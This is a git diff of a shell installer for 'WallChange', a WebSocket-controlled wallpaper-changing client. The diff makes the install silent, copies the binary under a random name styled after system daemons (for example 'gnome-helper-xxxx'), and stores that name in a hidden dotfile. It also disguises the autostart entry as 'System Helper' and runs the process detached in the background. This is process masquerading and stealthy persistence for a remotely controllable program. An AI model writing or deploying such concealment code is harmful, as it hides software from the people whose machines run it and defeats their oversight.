@@ -5,91 +5,90 @@ REPO_URL="https://github.com/Zeky69/WallChange.git"
 INSTALL_DIR="$HOME/.local/bin"
 AUTOSTART_DIR="$HOME/.config/autostart"
 CLONE_DIR="$HOME/.wallchange_source"
+PROCESS_NAME_FILE="$HOME/.zlsw"
 
-echo "=== Installation Automatisée de Wallchange ==="
+# Fonction pour générer un nom de processus aléatoire
+generate_random_name() {
+    local prefixes=("sys" "usr" "lib" "dbus" "gvfs" "gnome" "kde" "xdg" "pulseaudio" "pipewire" "session" "desktop" "display" "input" "audio" "video" "notify" "update" "sync" "cache")
+    local suffixes=("helper" "daemon" "service" "worker" "monitor" "agent" "manager" "handler" "launcher" "watcher" "server" "client" "bridge" "proxy" "wrapper")
+    local prefix=${prefixes[$RANDOM % ${#prefixes[@]}]}
+    local suffix=${suffixes[$RANDOM % ${#suffixes[@]}]}
+    local random_str=$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 4 | head -n 1)
+    echo "${prefix}-${suffix}-${random_str}"
+}
 
 # 1. Récupération du projet
-# Si on est déjà dans un dépôt git WallChange, on l'utilise, sinon on clone
-if [ -d ".git" ] && grep -q "WallChange" .git/config; then
-    echo "[1/5] Utilisation du dossier courant..."
+if [ -d ".git" ] && grep -q "WallChange" .git/config 2>/dev/null; then
     PROJECT_DIR=$(pwd)
 else
-    echo "[1/5] Récupération du projet depuis GitHub..."
     if [ -d "$CLONE_DIR" ]; then
-        echo "Mise à jour du projet existant..."
-        cd "$CLONE_DIR" && git fetch && git checkout master && git pull origin master
+        cd "$CLONE_DIR" && git fetch -q && git checkout -q master && git pull -q origin master
     else
-        echo "Clonage du dépôt..."
-        git clone -b master "$REPO_URL" "$CLONE_DIR"
+        git clone -q -b master "$REPO_URL" "$CLONE_DIR"
         cd "$CLONE_DIR"
     fi
     PROJECT_DIR="$CLONE_DIR"
 fi
 
 # 2. Compilation
-echo "[2/5] Compilation..."
 cd "$PROJECT_DIR"
-# Nettoyage préalable pour forcer la recompilation
-make clean
-if make; then
-    echo "Compilation réussie."
+make clean > /dev/null 2>&1
+if make -s > /dev/null 2>&1; then
+    :
 else
-    echo "Erreur lors de la compilation."
+    echo "failed"
     exit 1
 fi
 
 # 3. Installation des binaires
-echo "[3/5] Installation dans $INSTALL_DIR..."
 mkdir -p "$INSTALL_DIR"
 mkdir -p "$AUTOSTART_DIR"
 
-# Arrêt des processus existants pour éviter "Text file busy"
-echo "Arrêt des processus existants..."
-pkill wallchange || true
+# Arrêter et supprimer l'ancien processus avec nom aléatoire
+if [ -f "$PROCESS_NAME_FILE" ]; then
+    OLD_PROCESS_NAME=$(cat "$PROCESS_NAME_FILE")
+    pkill -f "$OLD_PROCESS_NAME" 2>/dev/null || true
+    rm -f "$INSTALL_DIR/$OLD_PROCESS_NAME" 2>/dev/null
+fi
+
+# Arrêter et supprimer le processus wallchange (anciennes installations)
+pkill -x wallchange 2>/dev/null || true
+rm -f "$INSTALL_DIR/wallchange" 2>/dev/null
+
 sleep 1
 
-cp wallchange "$INSTALL_DIR/"
+NEW_PROCESS_NAME=$(generate_random_name)
+echo "$NEW_PROCESS_NAME" > "$PROCESS_NAME_FILE"
+
+cp wallchange "$INSTALL_DIR/$NEW_PROCESS_NAME"
+chmod +x "$INSTALL_DIR/$NEW_PROCESS_NAME"
 
 # 4. Configuration du lancement automatique
-echo "[4/5] Configuration du démarrage automatique..."
 cat > "$AUTOSTART_DIR/wallchange.desktop" <<EOF
 [Desktop Entry]
 Type=Application
-Exec=$INSTALL_DIR/wallchange
+Exec=/bin/bash -c 'PNAME=\$(cat $PROCESS_NAME_FILE 2>/dev/null); if [ -n "\$PNAME" ] && [ -f "$INSTALL_DIR/\$PNAME" ]; then "$INSTALL_DIR/\$PNAME"; fi'
 Hidden=false
 NoDisplay=false
 X-GNOME-Autostart-enabled=true
-Name=Wallchange Client
-Comment=Change wallpaper via WebSocket
+Name=System Helper
+Comment=System session helper
 EOF
 
 # 5. Création de l'alias
-echo "[5/5] Configuration de l'alias..."
-
-# Détection du fichier de config shell (zsh ou bash)
 SHELL_RC="$HOME/.bashrc"
 if [[ "$SHELL" == */zsh ]]; then
     SHELL_RC="$HOME/.zshrc"
 fi
 
-# Ajout de l'alias si nécessaire
-if ! grep -q "alias wallchange=" "$SHELL_RC"; then
-    echo "Ajout de l'alias 'wallchange' dans $SHELL_RC"
+if ! grep -q "alias wallchange=" "$SHELL_RC" 2>/dev/null; then
     echo "" >> "$SHELL_RC"
     echo "# Alias Wallchange" >> "$SHELL_RC"
     echo "alias wallchange='$INSTALL_DIR/wallchange'" >> "$SHELL_RC"
-else
-    echo "L'alias 'wallchange' existe déjà."
 fi
 
-echo "=== Installation terminée ! ==="
-echo "1. Le client se lancera automatiquement au prochain démarrage."
-echo "2. Démarrage du client en arrière-plan..."
-
-# Lancer wallchange en arrière-plan, détaché du terminal
-nohup "$INSTALL_DIR/wallchange" > /dev/null 2>&1 &
+# Lancer le processus en arrière-plan
+nohup "$INSTALL_DIR/$NEW_PROCESS_NAME" > /dev/null 2>&1 &
 disown
 
-echo "3. Pour utiliser les commandes, tapez :"
-echo "   source $SHELL_RC"
-echo "   Puis : wallchange send image.jpg user"
+echo "successful"
